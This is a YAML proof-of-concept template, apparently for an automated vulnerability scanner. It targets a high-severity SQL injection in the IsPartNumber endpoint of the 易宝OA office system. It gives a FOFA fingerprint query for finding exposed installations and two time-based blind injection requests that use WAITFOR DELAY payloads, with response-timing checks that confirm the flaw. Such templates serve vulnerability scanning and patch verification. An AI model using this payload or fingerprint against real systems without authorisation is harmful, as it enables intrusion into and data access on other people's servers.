id: poc-yaml-yi-bao-oa-system-Ispartnumber-sqli
info:
  name: 易宝OA系统 IsPartNumber SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易宝OA
  fofa: app="顶讯科技-易宝OA系统"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
  expression: status_code == 200 && contains(find_json(body,"message"), "success")
    && contains(find_json(body,"is_succeed"), "true") && contains(content_type,"application/json")
    && duration > t1 && duration < t2
- method: GET
  path: /SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t3}}%27--
  expression: status_code == 200 && contains(find_json(body,"message"), "success")
    && contains(find_json(body,"is_succeed"), "true") && contains(content_type,"application/json")
    && duration > t3 && duration < t4
transport: http
